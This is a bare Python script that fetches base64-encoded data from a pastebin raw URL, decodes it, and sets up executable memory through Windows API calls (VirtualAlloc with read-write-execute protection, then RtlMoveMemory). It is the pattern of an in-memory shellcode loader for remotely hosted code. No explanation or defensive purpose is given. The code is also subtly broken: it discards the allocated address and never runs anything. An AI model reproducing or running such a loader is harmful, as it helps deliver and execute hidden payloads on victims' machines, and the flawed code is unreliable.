import base64, ctypes, urllib.request
page = urllib.request.urlopen("https://pastebin.com/raw/labdead").read()
payload = base64.b64decode(page)
buf = ctypes.create_string_buffer(payload, len(payload))
ctypes.windll.kernel32.VirtualAlloc(None, len(payload), 0x3000, 0x40)
ctypes.windll.ntdll.RtlMoveMemory(buf, payload, len(payload))
